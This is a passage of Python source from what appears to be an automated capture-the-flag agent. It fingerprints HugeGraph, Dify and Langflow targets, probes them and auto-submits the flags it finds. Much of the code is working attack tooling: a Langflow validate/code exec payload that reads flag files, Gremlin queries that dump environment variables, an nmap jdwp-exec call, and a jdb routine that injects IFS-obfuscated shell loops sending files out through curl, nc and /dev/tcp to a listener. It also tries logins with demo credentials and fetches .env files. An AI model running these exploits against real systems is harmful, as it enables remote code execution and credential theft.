    def _benchmark_builtin_service_probe_profiles(self) -> list[dict[str, Any]]:
        return [
            {
                "fingerprint": "hugegraph",
                "match_any": (
                    '"service":"hugegraph"',
                    '"service": "hugegraph"',
                    "hugegraph.apache.org",
                ),
                "match_any_all": (
                    ('"gremlin"', '"arthas"'),
                ),
                "probe": self._benchmark_probe_hugegraph_local,
                "unresolved": "reasoning",
                "reason": (
                    "HugeGraph/Gremlin/Arthas/JDWP 服务指纹已确认，需要服务专项深挖"
                ),
            },
            {
                "fingerprint": "dify",
                "match_all": (
                    "data-api-prefix",
                    "127.0.0.1:5001",
                ),
                "match_any": (
                    "dify",
                    "self_hosted",
                    "/_next/static/",
                    "x-powered-by: next.js",
                ),
                "probe": self._benchmark_probe_dify_local,
                "unresolved": "reasoning",
                "reason": (
                    "Dify/Next.js 前端可达但后端疑似绑定 localhost，需要 Dify 专项深挖"
                ),
            },
            {
                "fingerprint": "langflow",
                "match_all": ("langflow",),
                "match_any": (
                    "<title>langflow</title>",
                    '"title":"langflow"',
                    "/api/v1/validate/code",
                    "server: uvicorn",
                ),
                "probe": lambda code, base, _evidence: self._benchmark_probe_langflow_local(
                    code,
                    base,
                ),
                "unresolved": "abandoned",
                "reason": "Langflow bounded validate/code 探测未发现可提交 flag",
            },
        ]

    def _benchmark_service_probe_registry(self) -> dict[str, Any]:
        return {
            "dify": self._benchmark_probe_dify_local,
            "hugegraph": self._benchmark_probe_hugegraph_local,
            "langflow": lambda code, base, _evidence: self._benchmark_probe_langflow_local(
                code,
                base,
            ),
        }

    @staticmethod
    def _benchmark_normalize_probe_headers(raw: Any) -> dict[str, str]:
        if not isinstance(raw, dict):
            return {}
        headers: dict[str, str] = {}
        for key, value in list(raw.items())[:8]:
            header = str(key or "").strip()
            if not _re_mod.fullmatch(r"[A-Za-z0-9-]{1,60}", header):
                continue
            if header.lower() in {"host", "content-length", "authorization", "benchmark_token"}:
                continue
            headers[header] = str(value or "").strip()[:300]
        return headers

    @staticmethod
    def _benchmark_normalize_probe_body(raw: Any) -> dict[str, Any] | None:
        if not isinstance(raw, dict):
            return None
        body: dict[str, Any] = {}
        for key, value in list(raw.items())[:20]:
            body_key = str(key or "").strip()
            if not _re_mod.fullmatch(r"[A-Za-z0-9_.:-]{1,80}", body_key):
                continue
            if isinstance(value, (str, int, float, bool)) or value is None:
                body[body_key] = value if not isinstance(value, str) else value[:1000]
            elif isinstance(value, (list, tuple)):
                items: list[Any] = []
                for item in list(value)[:12]:
                    if isinstance(item, (str, int, float, bool)) or item is None:
                        items.append(item if not isinstance(item, str) else item[:500])
                body[body_key] = items
            elif isinstance(value, dict):
                nested: dict[str, Any] = {}
                for nested_key, nested_value in list(value.items())[:12]:
                    nested_name = str(nested_key or "").strip()
                    if not _re_mod.fullmatch(r"[A-Za-z0-9_.:-]{1,80}", nested_name):
                        continue
                    if isinstance(nested_value, (str, int, float, bool)) or nested_value is None:
                        nested[nested_name] = (
                            nested_value
                            if not isinstance(nested_value, str)
                            else nested_value[:500]
                        )
                if nested:
                    body[body_key] = nested
        return body or None

    def _benchmark_normalize_probe_requests(self, raw: Any) -> tuple[dict[str, Any], ...]:
        if not isinstance(raw, list):
            return ()
        requests: list[dict[str, Any]] = []
        for item in raw[:20]:
            if not isinstance(item, dict):
                continue
            raw_path = str(item.get("path") or item.get("url_path") or "").strip()
            if not raw_path or raw_path.startswith(("http://", "https://", "//")):
                continue
            path = raw_path.lstrip("/")
            if not _re_mod.fullmatch(r"[A-Za-z0-9_./?=&:%+\-]{1,220}", path):
                continue
            method = str(item.get("method") or "GET").strip().upper()
            if method not in {"GET", "POST", "PUT"}:
                continue
            request: dict[str, Any] = {"method": method, "path": path}
            label = str(item.get("label") or "").strip()
            if label:
                request["label"] = label[:100]
            headers = self._benchmark_normalize_probe_headers(item.get("headers"))
            if headers:
                request["headers"] = headers
            json_body = self._benchmark_normalize_probe_body(item.get("json"))
            data_body = self._benchmark_normalize_probe_body(
                item.get("data", item.get("form"))
            )
            if json_body is not None:
                request["json"] = json_body
            elif data_body is not None:
                request["data"] = {
                    key: str(value)[:1000]
                    for key, value in data_body.items()
                    if isinstance(value, (str, int, float, bool)) or value is None
                }
            requests.append(request)
        return tuple(requests)

    @staticmethod
    def _benchmark_normalize_tcp_ports(raw: Any) -> tuple[dict[str, Any], ...]:
        if not isinstance(raw, list):
            return ()
        ports: list[dict[str, Any]] = []
        for item in raw[:20]:
            label = ""
            raw_port: Any = item
            if isinstance(item, dict):
                raw_port = item.get("port")
                label = str(item.get("label") or "").strip()[:80]
            try:
                port = int(raw_port)
            except (TypeError, ValueError):
                continue
            if port < 1 or port > 65535:
                continue
            entry: dict[str, Any] = {"port": port}
            if label:
                entry["label"] = label
            ports.append(entry)
        seen: set[int] = set()
        unique: list[dict[str, Any]] = []
        for entry in ports:
            port = int(entry["port"])
            if port in seen:
                continue
            seen.add(port)
            unique.append(entry)
        return tuple(unique)

    def _benchmark_normalize_service_probe_profile(
        self,
        raw: Any,
    ) -> dict[str, Any] | None:
        if not isinstance(raw, dict):
            return None
        fingerprint = str(raw.get("fingerprint") or "").strip().lower()
        if not _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", fingerprint):
            return None
        profile: dict[str, Any] = {"fingerprint": fingerprint}
        for key in ("match_all", "match_any"):
            values = self._benchmark_string_tuple(raw.get(key))
            if values:
                profile[key] = values
        any_all = self._benchmark_match_any_all_tuple(raw.get("match_any_all"))
        if any_all:
            profile["match_any_all"] = any_all
        unresolved = str(raw.get("unresolved") or "reasoning").strip().lower()
        profile["unresolved"] = unresolved if unresolved in {"reasoning", "abandoned"} else "reasoning"
        reason = str(raw.get("reason") or "").strip()
        if reason:
            profile["reason"] = reason[:500]
        handoff_context = str(raw.get("handoff_context") or "").strip()
        if handoff_context:
            profile["handoff_context"] = handoff_context[:3000]
        handoff_steps = self._benchmark_string_tuple(raw.get("handoff_steps"), limit=10)
        if handoff_steps:
            profile["handoff_steps"] = handoff_steps
        probe_paths = self._benchmark_string_tuple(raw.get("probe_paths"), limit=40)
        if probe_paths:
            profile["probe_paths"] = probe_paths
        probe_requests = self._benchmark_normalize_probe_requests(raw.get("probe_requests"))
        if probe_requests:
            profile["probe_requests"] = probe_requests
        tcp_ports = self._benchmark_normalize_tcp_ports(raw.get("tcp_ports"))
        if tcp_ports:
            profile["tcp_ports"] = tcp_ports
        probe_key = str(raw.get("probe_key") or "").strip().lower()
        probe = self._benchmark_service_probe_registry().get(probe_key)
        if callable(probe):
            profile["probe"] = probe
        if not any(
            key in profile
            for key in (
                "match_all",
                "match_any",
                "match_any_all",
                "probe_paths",
                "probe_requests",
                "tcp_ports",
                "handoff_context",
                "handoff_steps",
                "reason",
                "probe",
            )
        ):
            return None
        return profile

    def _benchmark_external_service_probe_profiles(self) -> list[dict[str, Any]]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("service_probe_profiles", data.get("service_profiles", []))
        if not isinstance(raw_profiles, list):
            return []
        profiles: list[dict[str, Any]] = []
        for raw in raw_profiles[:40]:
            profile = self._benchmark_normalize_service_probe_profile(raw)
            if profile is not None:
                profiles.append(profile)
        return profiles

    def _benchmark_service_probe_profiles(self) -> list[dict[str, Any]]:
        return self._benchmark_merge_profiles_by_key(
            self._benchmark_builtin_service_probe_profiles(),
            self._benchmark_external_service_probe_profiles(),
            "fingerprint",
        )

    @staticmethod
    def _benchmark_text_matches_profile(
        text: str,
        profile: dict[str, Any],
    ) -> bool:
        lowered = text.lower()
        all_tokens = tuple(str(token).lower() for token in profile.get("match_all", ()))
        any_tokens = tuple(str(token).lower() for token in profile.get("match_any", ()))
        any_all_groups = tuple(profile.get("match_any_all", ()))

        if all_tokens and not all(token in lowered for token in all_tokens):
            return False
        if any_tokens and any(token in lowered for token in any_tokens):
            return True
        for raw_group in any_all_groups:
            group = tuple(str(token).lower() for token in raw_group)
            if group and all(token in lowered for token in group):
                return True
        return bool(all_tokens) and not any_tokens and not any_all_groups

    def _benchmark_probe_matching_service_local(
        self,
        code: str,
        base: str,
        evidence: str,
    ) -> tuple[bool, list[str]]:
        profile = self._benchmark_matching_service_probe_profile(evidence)
        if profile is None:
            return False, []
        service_outputs = self._benchmark_run_service_probe_profile(
            code,
            base,
            evidence,
            profile,
        )
        return True, service_outputs

    def _benchmark_matching_service_probe_profile(
        self,
        evidence: str,
    ) -> dict[str, Any] | None:
        for profile in self._benchmark_service_probe_profiles():
            suggests = profile.get("suggests")
            if callable(suggests):
                matched = bool(suggests(evidence))
            else:
                matched = self._benchmark_text_matches_profile(evidence, profile)
            if matched:
                return profile
        return None

    def _benchmark_run_service_probe_profile(
        self,
        code: str,
        base: str,
        evidence: str,
        profile: dict[str, Any],
    ) -> list[str]:
        fingerprint = str(profile["fingerprint"])
        self._benchmark_set_service_fingerprint(code, fingerprint)
        service_outputs: list[str] = []
        probe = profile.get("probe")
        if callable(probe):
            service_output = probe(code, base, evidence)
            if service_output:
                service_outputs.append(str(service_output))
        profile_path_output = self._benchmark_probe_profile_paths_local(
            code,
            base,
            profile,
        )
        if profile_path_output:
            service_outputs.append(profile_path_output)
        profile_request_output = self._benchmark_probe_profile_requests_local(
            code,
            base,
            profile,
        )
        if profile_request_output:
            service_outputs.append(profile_request_output)
        tcp_output = self._benchmark_probe_profile_tcp_ports_local(code, base, profile)
        if tcp_output:
            service_outputs.append(tcp_output)
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
        if code in completed:
            return service_outputs
        reason = str(profile.get("reason") or f"{fingerprint} bounded probe 未发现 flag")
        if profile.get("unresolved") == "reasoning":
            self._benchmark_mark_reasoning_needed(code, reason)
        else:
            self._benchmark_mark_abandoned(code, reason)
        return service_outputs

    def _benchmark_probe_profile_paths_local(
        self,
        code: str,
        base: str,
        profile: dict[str, Any],
    ) -> str:
        paths = self._benchmark_string_tuple(profile.get("probe_paths"), limit=20)
        if not paths:
            return ""
        fingerprint = str(profile.get("fingerprint") or "service")
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## {fingerprint}-profile-probe {base}"]
        seen: set[str] = set()
        for raw_path in paths:
            path = raw_path.lstrip("/")
            url = _urljoin(base, path)
            if url in seen:
                continue
            seen.add(url)
            result = self._benchmark_curl_local(
                url,
                tun_interface=tun_interface,
                timeout=8,
            )
            body = (result.stdout or "")[:5000]
            outputs.append(
                f"## GET /{path}\n{body}\n{(result.stderr or '')[:300]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: {fingerprint}_profile_probe {url}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
        return "\n".join(outputs)

    def _benchmark_probe_profile_requests_local(
        self,
        code: str,
        base: str,
        profile: dict[str, Any],
    ) -> str:
        raw_requests = profile.get("probe_requests")
        if not isinstance(raw_requests, (tuple, list)) or not raw_requests:
            return ""
        fingerprint = str(profile.get("fingerprint") or "service")
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## {fingerprint}-profile-requests {base}"]
        seen: set[tuple[str, str, str]] = set()
        for request in list(raw_requests)[:12]:
            if not isinstance(request, dict):
                continue
            method = str(request.get("method") or "GET").upper()
            path = str(request.get("path") or "").lstrip("/")
            url = _urljoin(base, path)
            body_key = json.dumps(
                request.get("json", request.get("data", "")),
                ensure_ascii=False,
                sort_keys=True,
                default=str,
            )[:1000]
            dedupe_key = (method, url, body_key)
            if dedupe_key in seen:
                continue
            seen.add(dedupe_key)
            label = str(request.get("label") or f"{method} /{path}")[:140]
            result: subprocess.CompletedProcess[str]
            if "json" in request:
                cmd = [
                    "curl",
                    "-sS",
                    "-k",
                    "--interface",
                    tun_interface,
                    "--connect-timeout",
                    "2",
                    "--max-time",
                    "6",
                    "--globoff",
                    "-i",
                    "-X",
                    method,
                    "-H",
                    "Content-Type: application/json",
                ]
                for header, value in dict(request.get("headers") or {}).items():
                    cmd.extend(["-H", f"{header}: {value}"])
                cmd.extend([
                    "-d",
                    json.dumps(request["json"], ensure_ascii=False, separators=(",", ":")),
                    url,
                ])
                try:
                    result = subprocess.run(
                        cmd,
                        check=False,
                        text=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        timeout=8,
                    )
                except Exception as exc:
                    result = subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))
            else:
                data = request.get("data")
                headers = dict(request.get("headers") or {})
                if method == "GET" and not headers and not data:
                    result = self._benchmark_curl_local(
                        url,
                        tun_interface=tun_interface,
                        timeout=8,
                    )
                else:
                    cmd = [
                        "curl",
                        "-sS",
                        "-k",
                        "--interface",
                        tun_interface,
                        "--connect-timeout",
                        "2",
                        "--max-time",
                        "6",
                        "--globoff",
                        "-i",
                        "-X",
                        method,
                    ]
                    for header, value in headers.items():
                        cmd.extend(["-H", f"{header}: {value}"])
                    if isinstance(data, dict):
                        for key, value in data.items():
                            cmd.extend(["--data-urlencode", f"{key}={value}"])
                    cmd.append(url)
                    try:
                        result = subprocess.run(
                            cmd,
                            check=False,
                            text=True,
                            stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            timeout=8,
                        )
                    except Exception as exc:
                        result = subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))
            body = (result.stdout or "")[:5000]
            outputs.append(f"## {label}\n{body}\n{(result.stderr or '')[:300]}")
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: {fingerprint}_profile_request {label} {url}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
        return "\n".join(outputs)

    def _benchmark_probe_profile_tcp_ports_local(
        self,
        code: str,
        base: str,
        profile: dict[str, Any],
    ) -> str:
        raw_ports = profile.get("tcp_ports")
        if not isinstance(raw_ports, (tuple, list)) or not raw_ports:
            return ""
        parsed = _urlparse(base)
        host = parsed.hostname or ""
        if not host:
            return ""
        fingerprint = str(profile.get("fingerprint") or "service")
        outputs: list[str] = [f"## {fingerprint}-tcp-probe {host}"]
        seen: set[int] = set()
        for entry in list(raw_ports)[:12]:
            if not isinstance(entry, dict):
                continue
            try:
                port = int(entry.get("port"))
            except (TypeError, ValueError):
                continue
            if port in seen:
                continue
            seen.add(port)
            label = str(entry.get("label") or f"tcp/{port}")[:80]
            reachable = self._benchmark_probe_tcp_port(host, port)
            outputs.append(f"## {label} {host}:{port}\nreachable={reachable}")
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: {fingerprint}_tcp_probe {host}:{port}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                "退出码: 0\n"
                "输出:\n"
                f"{label} reachable={reachable}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
        return "\n".join(outputs)

    def _benchmark_probe_langflow_local(self, code: str, base: str) -> str:
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## langflow-probe {base}"]

        for path in ("api/v1/version", "api/v1/config", "openapi.json"):
            result = self._benchmark_curl_local(
                _urljoin(base, path),
                tun_interface=tun_interface,
                timeout=8,
            )
            body = (result.stdout or "")[:5000]
            outputs.append(f"## GET /{path}\n{body}\n{(result.stderr or '')[:300]}")
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: langflow_probe {_urljoin(base, path)}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        for flag_path in self._benchmark_flag_paths(limit=20):
            payload = {
                "code": (
                    "@exec(\"raise Exception(open("
                    f"{flag_path!r}"
                    ").read())\")\n"
                    "def probe():\n"
                    "    pass\n"
                )
            }
            result = self._benchmark_curl_json_local(
                _urljoin(base, "api/v1/validate/code"),
                tun_interface=tun_interface,
                method="POST",
                payload=payload,
                timeout=8,
            )
            body = result.stdout or ""
            outputs.append(
                f"## POST /api/v1/validate/code {flag_path}\n"
                f"{body[:3000]}\n{(result.stderr or '')[:300]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: langflow_validate_code {_urljoin(base, 'api/v1/validate/code')}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body[:12000]}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
        return "\n".join(outputs)

    def _benchmark_probe_dify_local(self, code: str, base: str, probe: str) -> str:
        """Run bounded Dify/Next.js checks and keep the active task for reasoning."""
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## dify-probe {base}"]
        collected = probe

        def append_result(label: str, result: subprocess.CompletedProcess[str]) -> None:
            nonlocal collected
            body = result.stdout or ""
            collected += "\n" + body
            interesting = "\n".join(
                line[:500]
                for line in body.splitlines()
                if any(
                    marker in line.lower()
                    for marker in (
                        "flag{",
                        "tsec{",
                        "ctf{",
                        "data-api-prefix",
                        "127.0.0.1:5001",
                        "console/api",
                        "/api/",
                        "not_setup",
                        "already_setup",
                        "signin",
                        "install",
                        "secret",
                        "token",
                    )
                )
            )
            status = (body.splitlines() or [""])[0][:160]
            outputs.append(
                f"## {label}\n{status}\n{interesting[:2500]}\n{(result.stderr or '')[:300]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: dify_probe {label} {base}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body[:12000]}"
            )

        for path in (
            "apps",
            "signin",
            "install",
            "console/api/setup",
            "console/api/system-features",
            "console/api/version",
            "api/site",
            "api/parameters",
            "flag",
            "api/flag",
            ".env",
            ".env.local",
        ):
            result = self._benchmark_curl_local(
                _urljoin(base, path),
                tun_interface=tun_interface,
                timeout=7,
            )
            append_result(f"GET /{path}", result)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        chunk_paths = list(
            dict.fromkeys(
                _re_mod.findall(
                    r"""/_next/static/chunks/[^"'\s<>]+?\.js""",
                    collected,
                )
            )
        )
        for chunk_path in chunk_paths[:24]:
            result = self._benchmark_curl_local(
                _urljoin(base, chunk_path),
                tun_interface=tun_interface,
                timeout=8,
            )
            append_result(f"GET {chunk_path}", result)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        return "\n".join(outputs)

    def _benchmark_probe_hugegraph_local(self, code: str, base: str, probe: str) -> str:
        """Run bounded HugeGraph-specific checks before falling back to reasoning."""
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## hugegraph-probe {base}"]

        def append_http(label: str, result: subprocess.CompletedProcess[str]) -> None:
            body = (result.stdout or "")[:5000]
            outputs.append(
                f"## {label}\n{body}\n{(result.stderr or '')[:500]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: hugegraph_probe {label} {base}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n"
                "输出:\n"
                f"{body}"
            )

        for path in (
            "versions",
            "graphs",
            "graphs/hugegraph/schema",
            "graphs/hugegraph/variables",
            "graphs/hugegraph/conf",
            "graphs/hugegraph/graph/vertices?limit=10",
            "graphs/hugegraph/graph/edges?limit=10",
        ):
            result = self._benchmark_curl_local(
                _urljoin(base, path),
                tun_interface=tun_interface,
                timeout=7,
            )
            append_http(f"GET /{path}", result)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        for expression in (
            "System.getenv()",
            "System.getProperties()",
            "hugegraph.traversal().V().limit(10).toList()",
            "hugegraph.traversal().E().limit(10).toList()",
        ):
            cmd = [
                "curl",
                "-sS",
                "-k",
                "--interface",
                tun_interface,
                "--connect-timeout",
                "2",
                "--max-time",
                "8",
                "--globoff",
                "-i",
                "-X",
                "POST",
                "-H",
                "Content-Type: application/json",
                "-d",
                json.dumps({"gremlin": expression}, separators=(",", ":")),
                _urljoin(base, "gremlin"),
            ]
            try:
                result = subprocess.run(
                    cmd,
                    check=False,
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=10,
                )
            except Exception as exc:
                result = subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))
            append_http(f"POST /gremlin {expression}", result)
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                return "\n".join(outputs)

        arthas = self._benchmark_curl_json_local(
            _urljoin(base, "arthas"),
            tun_interface=tun_interface,
            method="PUT",
            payload={"command": "help"},
            timeout=8,
        )
        append_http("PUT /arthas help", arthas)

        parsed = _urlparse(base)
        host = parsed.hostname or ""
        if host:
            for port, label in ((5005, "JDWP"), (8561, "Arthas HTTP"), (8562, "Arthas telnet")):
                reachable = self._benchmark_probe_tcp_port(host, port)
                outputs.append(f"## {label} {host}:{port}\nreachable={reachable}")
            jdwp_output = self._benchmark_probe_jdwp_local(host, 5005, base)
            if jdwp_output:
                outputs.append(jdwp_output)
                self._benchmark_auto_submit_flags_from_tool_result(
                    f"命令: jdwp_probe http://{host}:5005\n"
                    "工作目录: /home/my/cyber/benchmark_test\n"
                    "退出码: 0\n"
                    "输出:\n"
                    f"{jdwp_output}"
                )
        return "\n".join(outputs)

    def _benchmark_curl_json_local(
        self,
        url: str,
        *,
        tun_interface: str,
        method: str = "POST",
        payload: dict[str, Any] | None = None,
        timeout: int = 8,
    ) -> subprocess.CompletedProcess[str]:
        cmd = [
            "curl",
            "-sS",
            "-k",
            "--interface",
            tun_interface,
            "--connect-timeout",
            "2",
            "--max-time",
            str(max(3, timeout - 2)),
            "--globoff",
            "-i",
            "-X",
            method.upper(),
            "-H",
            "Content-Type: application/json",
        ]
        if payload is not None:
            cmd.extend(["-d", json.dumps(payload, ensure_ascii=False, separators=(",", ":"))])
        cmd.append(url)
        try:
            return subprocess.run(
                cmd,
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
        except Exception as exc:
            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))

    @staticmethod
    def _benchmark_probe_tcp_port(host: str, port: int) -> bool:
        try:
            with socket_mod.create_connection((host, port), timeout=2):
                return True
        except OSError:
            return False

    def _benchmark_probe_jdwp_local(
        self,
        host: str,
        port: int,
        trigger_base: str = "",
    ) -> str:
        if not self._benchmark_probe_tcp_port(host, port):
            return ""
        outputs = [f"## jdwp-probe {host}:{port}", "JDWP port reachable"]
        try:
            with socket_mod.create_connection((host, port), timeout=3) as sock:
                sock.settimeout(3)
                sock.sendall(b"JDWP-Handshake")
                reply = sock.recv(14)
                outputs.append(f"handshake={reply.decode('ascii', errors='replace')!r}")
        except OSError as exc:
            outputs.append(f"handshake_error={exc}")
            return "\n".join(outputs)

        nmap_flag_command = self._benchmark_flag_cat_command(limit=20).strip()
        nmap_cmd = [
            "nmap",
            "-n",
            "-Pn",
            "-sT",
            f"-p{port}",
            "--script=+jdwp-exec",
            "--script-args",
            f"cmd={nmap_flag_command}",
            host,
        ]
        try:
            result = subprocess.run(
                nmap_cmd,
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=20,
            )
            outputs.append(
                f"## jdwp-exec {nmap_flag_command}\n"
                f"{(result.stdout or '')[:5000]}\n{(result.stderr or '')[:1000]}"
            )
        except Exception as exc:
            outputs.append(f"jdwp_exec_error={exc}")
        jdb_output = self._benchmark_probe_jdwp_jdb_exfil_local(
            host,
            port,
            trigger_base,
        )
        if jdb_output:
            outputs.append(jdb_output)
        return "\n".join(outputs)

    def _benchmark_probe_jdwp_jdb_exfil_local(
        self,
        host: str,
        port: int,
        trigger_base: str = "",
    ) -> str:
        """Use jdb once to trigger Runtime.exec and exfiltrate common flag paths.

        This is intentionally bounded. JDWP targets are high-value, but an
        interactive debugger can otherwise keep an easy Benchmark task alive
        forever. If this returns no flag, the caller should prefer close/switch.
        """
        tun = self._benchmark_detect_tun_local()
        if not tun:
            return "## jdwp-jdb-exfil\nskip=no_tun_interface"
        tun_interface, tun_ip = tun
        if not tun_ip:
            return "## jdwp-jdb-exfil\nskip=no_tun_ip"

        listener = socket_mod.socket(socket_mod.AF_INET, socket_mod.SOCK_STREAM)
        listener.setsockopt(socket_mod.SOL_SOCKET, socket_mod.SO_REUSEADDR, 1)
        try:
            listener.bind((tun_ip, 0))
            listener.listen(2)
            listener.settimeout(18)
            listen_port = int(listener.getsockname()[1])
        except OSError as exc:
            listener.close()
            return f"## jdwp-jdb-exfil\nlistener_error={exc}"

        received: list[bytes] = []

        def accept_once() -> None:
            try:
                conn, _addr = listener.accept()
                with conn:
                    conn.settimeout(2)
                    chunks: list[bytes] = []
                    while True:
                        try:
                            chunk = conn.recv(4096)
                        except OSError:
                            break
                        if not chunk:
                            break
                        chunks.append(chunk)
                        if sum(len(part) for part in chunks) > 65536:
                            break
                    received.append(b"".join(chunks))
            except OSError:
                return
            finally:
                try:
                    listener.close()
                except OSError:
                    pass

        accept_thread = threading.Thread(target=accept_once, daemon=True)
        accept_thread.start()

        path_list = "${IFS}".join(self._benchmark_flag_paths(limit=20))
        file_loop = (
            f"for${{IFS}}f${{IFS}}in${{IFS}}{path_list};"
            "do${IFS}[${IFS}-r${IFS}$f${IFS}]&&cat${IFS}$f;"
            "done"
        )
        callbacks = (
            f"{file_loop}|curl${{IFS}}-m${{IFS}}3${{IFS}}-sS${{IFS}}-XPOST"
            f"${{IFS}}--data-binary${{IFS}}@-${{IFS}}http://{tun_ip}:{listen_port}/",
            f"{file_loop}|nc${{IFS}}{tun_ip}${{IFS}}{listen_port}",
            f"{file_loop}>/dev/tcp/{tun_ip}/{listen_port}",
        )
        commands = [
            "stop in java.lang.String.indexOf(java.lang.String)",
            "stop in java.lang.String.equals(java.lang.Object)",
        ]
        commands.extend(
            f'print java.lang.Runtime.getRuntime().exec("/bin/sh -c {payload}")'
            for payload in callbacks
        )
        commands.append("cont")
        commands.append("quit")

        proc: subprocess.Popen[str] | None = None
        trigger_stdout = ""
        trigger_stderr = ""
        jdb_output = ""
        try:
            proc = subprocess.Popen(
                ["jdb", "-attach", f"{host}:{port}"],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
            )
            time_mod.sleep(1.5)
            if proc.stdin is not None:
                proc.stdin.write(commands[0] + "\n")
                proc.stdin.write(commands[1] + "\n")
                proc.stdin.flush()
            trigger_url = _urljoin(trigger_base or f"http://{host}:8080/", "versions")
            trigger = subprocess.run(
                [
                    "curl",
                    "-sS",
                    "--interface",
                    tun_interface,
                    "--connect-timeout",
                    "2",
                    "--max-time",
                    "5",
                    trigger_url,
                ],
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=7,
            )
            trigger_stdout = trigger.stdout[:300]
            trigger_stderr = trigger.stderr[:300]
            time_mod.sleep(1.5)
            if proc.stdin is not None:
                for command in commands[2:]:
                    proc.stdin.write(command + "\n")
                    proc.stdin.flush()
                    time_mod.sleep(0.2)
            try:
                jdb_output, _ = proc.communicate(timeout=6)
            except subprocess.TimeoutExpired:
                proc.kill()
                jdb_output, _ = proc.communicate(timeout=3)
        except Exception as exc:
            if proc is not None:
                try:
                    proc.kill()
                except Exception:
                    pass
            return f"## jdwp-jdb-exfil\nerror={exc}"
        finally:
            try:
                listener.close()
            except OSError:
                pass

        accept_thread.join(timeout=1)
        callback_text = b"\n".join(received).decode("utf-8", errors="replace")
        return (
            "## jdwp-jdb-exfil\n"
            f"listener={tun_ip}:{listen_port}\n"
            f"trigger_stdout={trigger_stdout}\n"
            f"trigger_stderr={trigger_stderr}\n"
            f"callback={callback_text[:4000]}\n"
            f"jdb={jdb_output[:4000]}"
        )

    def _benchmark_probe_common_webapp_flows(self, code: str, base: str, probe: str) -> str:
        """Follow common benchmark web-app clues that need cookies or state.

        The deterministic URL loop is intentionally stateless. Several easy
        tasks expose demo credentials first and only reveal the useful attack
        surface after login, so this helper keeps a cookie jar for a tight,
        bounded follow-up pass.
        """
        lowered = probe.lower()
        profile = self._benchmark_matching_webapp_flow_profile(lowered)
        if not profile:
            return ""
        credentials = self._benchmark_extract_demo_credentials(probe)
        if not credentials:
            credentials = list(profile.get("credentials") or [])
        tun_interface = self._benchmark_tun_interface()
        cookie_file = tempfile.NamedTemporaryFile(prefix="cyber-agent-bench-", suffix=".cookies", delete=False)
        cookie_path = cookie_file.name
        cookie_file.close()
        outputs: list[str] = [f"## stateful-webapp-flow {base}"]
        try:
            for username, password in credentials[:4]:
                login_url = self._benchmark_login_url_from_probe(base, probe)
                result = self._benchmark_curl_local(
                    login_url,
                    tun_interface=tun_interface,
                    cookie_path=cookie_path,
                    method="POST",
                    data={"username": username, "password": password},
                    timeout=8,
                )
                outputs.append(
                    f"## login {username}:{password} {login_url}\n"
                    f"{(result.stdout or '')[:1600]}\n{(result.stderr or '')[:300]}"
                )
                if "location: /login.php" in (result.stdout or "").lower() and "dashboard" not in (result.stdout or "").lower():
                    continue
                auth_output = self._benchmark_probe_authenticated_webapp(
                    code,
                    base,
                    tun_interface,
                    cookie_path,
                    probe,
                    profile,
                )
                if auth_output:
